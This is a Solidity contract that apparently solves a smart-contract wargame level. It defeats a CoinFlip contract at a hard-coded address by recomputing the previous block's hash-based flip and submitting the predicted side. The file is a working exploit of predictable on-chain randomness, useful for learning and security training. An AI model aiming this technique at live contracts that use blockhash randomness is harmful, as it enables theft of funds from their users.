// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel03.sol";

contract CoinFlipAttacker {
    CoinFlip level03 = CoinFlip(0x7F04F45faF735B9E23cb5F9A6D92aD391E2c40D6);
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function exploit() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        level03.flip(side);
    }
}
